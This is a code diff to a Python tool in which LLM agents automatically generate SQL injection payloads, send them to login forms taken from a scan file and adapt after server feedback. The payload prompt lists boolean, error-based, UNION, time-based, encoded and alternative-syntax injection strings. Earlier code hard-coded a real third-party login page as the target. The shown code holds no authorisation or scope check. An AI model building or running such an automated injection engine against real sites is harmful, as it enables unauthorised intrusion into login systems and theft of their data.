@@ -282,6 +282,7 @@ import requests
 import time
 import json
 import re
+import os
 
 def parse_json_from_state(value):
     """Parse JSON from state value, stripping markdown code blocks if present."""
@@ -617,27 +618,42 @@ sql_payload_agent = LlmAgent(
     model=GEMINI_MODEL,
     include_contents="none",
     instruction="""
-You are a SQL Injection Payload Generator.
+You are a SQL Injection Payload Generator that adapts based on feedback.
 
 Form context:
 Endpoint: {{form.endpoint}}
 Method: {{form.method}}
+Inputs: {{form.inputs}}
+Target field to attack: {{form.target_field}}
 
-Inputs:
-{{form.inputs}}
+Previous attempt feedback (if available):
+{{feedback}}
 
-Target field to attack:
-{{form.target_field}}
+Previous payload used (if available):
+{{payload}}
 
 Task:
-Generate ONE SQL injection payload suitable for the target field.
-- Email field → boolean / auth bypass payloads
-- Password field → boolean or error-based payloads
-- Ignore hidden fields
+Generate ONE NEW SQL injection payload that is DIFFERENT from previous attempts.
 
-Output ONLY the raw payload string.
-CRITICAL: NO markdown, NO code blocks, NO backticks, NO ```, NO explanations.
-Just the payload text, nothing else. For example, if the payload is ' OR '1'='1, output exactly: ' OR '1'='1
+Strategy based on feedback:
+- If status 419 (CSRF token missing) → Try different payload encoding or structure
+- If status 200 but no SQL error → Try error-based or time-based payloads
+- If previous payload was simple boolean → Try UNION-based or stacked queries
+- If previous payload was basic → Try encoded, obfuscated, or alternative syntax
+
+Payload types to rotate through:
+1. Boolean-based: ' OR '1'='1, ' OR 1=1--, admin'--
+2. Error-based: ', ", ;, ), etc. to trigger SQL errors
+3. UNION-based: ' UNION SELECT NULL--, ' UNION SELECT 1,2,3--
+4. Time-based: '; WAITFOR DELAY '00:00:05'--, ' OR SLEEP(5)--
+5. Encoded: %27 OR %271%27=%271, %27%20OR%20%271%27=%271
+6. Alternative syntax: ' OR 'x'='x, ' OR 1=1#, ' OR 'a'='a
+
+CRITICAL RULES:
+- Generate a DIFFERENT payload than what was used before (check {{payload}})
+- If feedback shows 419 error, the payload might need encoding or different approach
+- Output ONLY the raw payload string, NO markdown, NO code blocks, NO backticks, NO explanations
+- Just the payload text, nothing else
 """,
     output_key="payload"
 )
@@ -711,15 +727,6 @@ Payload to inject: {{payload}}
 Task:
 Build a JSON object with the actual values from the form and payload.
 
-Example structure (use ACTUAL values, not placeholders):
-{
-  "endpoint": "https://app.coolify.io/login",
-  "method": "POST",
-  "data": {
-    "email": "' OR '1'='1",
-    "password": "test"
-  }
-}
 
 Rules:
 - Use the ACTUAL endpoint value from {{form.endpoint}}
@@ -850,129 +857,239 @@ root_agent = SequentialAgent(
 from google.genai import types
 
 async def run():
+    import logging
+    from datetime import datetime
+    
+    # Setup logging to file and console
+    log_dir = "logs"
+    os.makedirs(log_dir, exist_ok=True)
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_file = os.path.join(log_dir, f"fuzzing_engine_{timestamp}.log")
+    
+    # Configure logging
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(levelname)s - %(message)s',
+        handlers=[
+            logging.FileHandler(log_file),
+            logging.StreamHandler()
+        ]
+    )
+    logger = logging.getLogger(__name__)
+    
+    logger.info("="*60)
+    logger.info("Starting SQL Injection Testing Workflow")
+    logger.info("="*60)
+    
+    # Load structure.json
+    # Get the path relative to this file
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    project_root = os.path.dirname(os.path.dirname(current_dir))  # Go up 2 levels to project root
+    structure_file = os.path.join(project_root, "scan_results", "structure.json")
+    
+    try:
+        with open(structure_file, 'r') as f:
+            structure_data = json.load(f)
+        forms = structure_data.get("forms", [])
+        logger.info(f"Loaded {len(forms)} forms from structure.json")
+        logger.info(f"Structure file path: {structure_file}")
+    except Exception as e:
+        logger.error(f"Failed to load structure.json: {e}")
+        return
+    
     session_service = InMemorySessionService()
-    # Create session - must await since it's async
-    session = await session_service.create_session(
-        app_name=APP_NAME,
-        user_id=USER_ID,
-        session_id=SESSION_ID
-    )
-    print(f"Created session: {session}")
     
-    runner = Runner(
-        agent=root_agent,
-        app_name=APP_NAME,
-        session_service=session_service
-    )
-    session_id = SESSION_ID
-    print(f"Using session_id: {session_id}")
-    
-    # Set form data directly in state using Event and EventActions
-    form_data = {
-        "endpoint": "app.coolify.io/login",
-        "method": "POST",
-        "inputs": [
-            {"name": "_token", "type": "hidden"},
-            {"name": "email", "type": "email"},
-            {"name": "password", "type": "password"}
-        ],
-        "target_field": "email"
-    }
-    
-    # Update state with form data using Event/EventActions (proper ADK way)
-    form_state_changes = {
-        "form": form_data
-    }
-    
-    form_actions = EventActions(state_delta=form_state_changes)
-    form_event = Event(
-        author="system",
-        actions=form_actions
-    )
-    
-    await session_service.append_event(session, form_event)
-    print(f"State after setting form: {session.state}")
-    
-    # ---------- Phase 1: planning ----------
-    # Run the agent pipeline - agents can access {{form.*}} from state
-    async for _ in runner.run_async(
-        user_id=USER_ID,
-        session_id=session_id,
-        new_message=types.Content(
-            role="user",
-            parts=[types.Part(text="Start SQL injection testing")]
+    # Process each form
+    for form_idx, form in enumerate(forms, 1):
+        logger.info(f"\n{'='*60}")
+        logger.info(f"Processing Form {form_idx}/{len(forms)}")
+        logger.info(f"Endpoint: {form.get('action')}")
+        logger.info(f"Method: {form.get('method')}")
+        logger.info(f"{'='*60}")
+        
+        # Determine target field (first required email/text field)
+        target_field = None
+        for inp in form.get("inputs", []):
+            if inp.get("type") in ["email", "text"] and inp.get("required"):
+                target_field = inp.get("name")
+                break
+        
+        if not target_field:
+            # Fallback to first non-hidden input
+            for inp in form.get("inputs", []):
+                if inp.get("type") != "hidden":
+                    target_field = inp.get("name")
+                    break
+        
+        if not target_field:
+            logger.warning(f"Form {form_idx}: No suitable target field found. Skipping.")
+            continue
+        
+        logger.info(f"Target field: {target_field}")
+        
+        # Create a unique session for each form
+        form_session_id = f"{SESSION_ID}_form_{form_idx}"
+        try:
+            session = await session_service.create_session(
+                app_name=APP_NAME,
+                user_id=USER_ID,
+                session_id=form_session_id
+            )
+            logger.info(f"Created session: {form_session_id}")
+        except Exception as e:
+            logger.error(f"Failed to create session for form {form_idx}: {e}")
+            continue
+        
+        runner = Runner(
+            agent=root_agent,
+            app_name=APP_NAME,
+            session_service=session_service
         )
-    ):
-        pass
-    
-    # Get the session again to access updated state after agent run
-    session = await session_service.get_session(
-        app_name=APP_NAME,
-        user_id=USER_ID,
-        session_id=session_id
-    )
-    print(f"State after agent run: {session.state}")
-    # ---------- Phase 2: Python execution ----------
-    # Get request from state (set by request_builder_agent with output_key="request")
-    state = session.state
-    request_raw = state.get("request")
-    
-    # Parse JSON from state, stripping markdown code blocks if present
-    request_args = parse_json_from_state(request_raw)
-    print(f"Request args (parsed): {request_args}")
-    
-    if not request_args:
-        raise ValueError("Request not found in state. Make sure the agent pipeline completed successfully.")
-    
-    if not isinstance(request_args, dict):
-        raise ValueError(f"Request args must be a dict, got {type(request_args)}: {request_args}")
-    
-    feedback = execute_attack(request_args)
-    print(f"Feedback: {feedback}")
-    
-    # Get the session to update state
-    session = await session_service.get_session(
-        app_name=APP_NAME,
-        user_id=USER_ID,
-        session_id=session_id
-    )
-    print(f"State after agent run: {session.state}")
-    
-    # Update state using Event and EventActions (proper ADK way)
-    state_changes = {
-        "feedback": feedback
-    }
-    
-    actions_with_update = EventActions(state_delta=state_changes)
-    system_event = Event(
-        author="system",
-        actions=actions_with_update
-    )
-    
-    await session_service.append_event(session, system_event)
-    print(f"State after adding feedback: {session.state}")
-    runner2= Runner(
-        agent=sql_evaluator_agent,
-        app_name=APP_NAME,
-        session_service=session_service
-    )
-
-    # ---------- Phase 3: evaluation ----------
-    async for event in runner2.run_async(
-        user_id=USER_ID,
-        session_id=session_id,
-        new_message=types.Content(
-            role="user",
-            parts=[
-                types.Part(text=str({
-                    "feedback": feedback
-                }))
-            ]
+        
+        # Set form data directly in state
+        form_data = {
+            "endpoint": form.get("action", ""),
+            "method": form.get("method", "GET"),
+            "inputs": form.get("inputs", []),
+            "target_field": target_field
+        }
+        
+        # Update state with form data using Event/EventActions
+        form_state_changes = {
+            "form": form_data,
+            "feedback": "",
+            "payload": ""
+        }
+        
+        form_actions = EventActions(state_delta=form_state_changes)
+        form_event = Event(
+            author="system",
+            actions=form_actions
         )
-    ):
-        if event.actions == EventActions.ESCALATE:
-            print("✅ SQLi confirmed or loop stopped")
-            break
+        
+        await session_service.append_event(session, form_event)
+        logger.info(f"State initialized for form {form_idx}")
+        
+        # Create evaluator runner
+        runner2 = Runner(
+            agent=sql_evaluator_agent,
+            app_name=APP_NAME,
+            session_service=session_service
+        )
+        
+        # Loop for 3 iterations per form
+        max_iterations = 3
+        for iteration in range(1, max_iterations + 1):
+            logger.info(f"\n[Form {form_idx}] Iteration {iteration}/{max_iterations}")
+            logger.info(f"{'='*60}")
+            
+            # ---------- Phase 1: planning ----------
+            logger.info(f"[Form {form_idx}] Phase 1: Generating payload and building request...")
+            try:
+                async for _ in runner.run_async(
+                    user_id=USER_ID,
+                    session_id=form_session_id,
+                    new_message=types.Content(
+                        role="user",
+                        parts=[types.Part(text=f"Start SQL injection testing - Iteration {iteration}")]
+                    )
+                ):
+                    pass
+            except Exception as e:
+                logger.error(f"[Form {form_idx}] Phase 1 error: {e}")
+                continue
+            
+            # Get the session again to access updated state
+            try:
+                session = await session_service.get_session(
+                    app_name=APP_NAME,
+                    user_id=USER_ID,
+                    session_id=form_session_id
+                )
+                logger.info(f"[Form {form_idx}] State after agent run: {session.state}")
+            except Exception as e:
+                logger.error(f"[Form {form_idx}] Failed to get session: {e}")
+                continue
+            
+            # ---------- Phase 2: Python execution ----------
+            logger.info(f"[Form {form_idx}] Phase 2: Executing attack...")
+            state = session.state
+            request_raw = state.get("request")
+            
+            request_args = parse_json_from_state(request_raw)
+            logger.info(f"[Form {form_idx}] Request args (parsed): {request_args}")
+            
+            if not request_args:
+                logger.warning(f"[Form {form_idx}] Request not found in state. Skipping iteration.")
+                continue
+            
+            if not isinstance(request_args, dict):
+                logger.warning(f"[Form {form_idx}] Request args must be a dict, got {type(request_args)}. Skipping iteration.")
+                continue
+            
+            try:
+                feedback = execute_attack(request_args)
+                logger.info(f"[Form {form_idx}] Feedback: {feedback}")
+            except Exception as e:
+                logger.error(f"[Form {form_idx}] Attack execution error: {e}")
+                continue
+            
+            # Get the session to update state
+            try:
+                session = await session_service.get_session(
+                    app_name=APP_NAME,
+                    user_id=USER_ID,
+                    session_id=form_session_id
+                )
+            except Exception as e:
+                logger.error(f"[Form {form_idx}] Failed to get session for state update: {e}")
+                continue
+            
+            # Update state with feedback
+            state_changes = {
+                "feedback": feedback,
+                "iteration": iteration
+            }
+            
+            actions_with_update = EventActions(state_delta=state_changes)
+            system_event = Event(
+                author="system",
+                actions=actions_with_update
+            )
+            
+            await session_service.append_event(session, system_event)
+            logger.info(f"[Form {form_idx}] State after adding feedback: {session.state}")
+            
+            # ---------- Phase 3: evaluation ----------
+            logger.info(f"[Form {form_idx}] Phase 3: Evaluating results...")
+            try:
+                async for event in runner2.run_async(
+                    user_id=USER_ID,
+                    session_id=form_session_id,
+                    new_message=types.Content(
+                        role="user",
+                        parts=[
+                            types.Part(text=str({
+                                "feedback": feedback,
+                                "iteration": iteration
+                            }))
+                        ]
+                    )
+                ):
+                    pass
+            except Exception as e:
+                logger.error(f"[Form {form_idx}] Phase 3 error: {e}")
+            
+            logger.info(f"[Form {form_idx}] Iteration {iteration} completed")
+        
+        logger.info(f"\n{'='*60}")
+        logger.info(f"Form {form_idx} Testing Completed")
+        logger.info(f"{'='*60}\n")
+    
+    logger.info(f"\n{'='*60}")
+    logger.info(f"✅ Completed testing all {len(forms)} forms")
+    logger.info(f"Logs saved to: {log_file}")
+    logger.info(f"{'='*60}\n")
 
 
 if __name__ == "__main__":
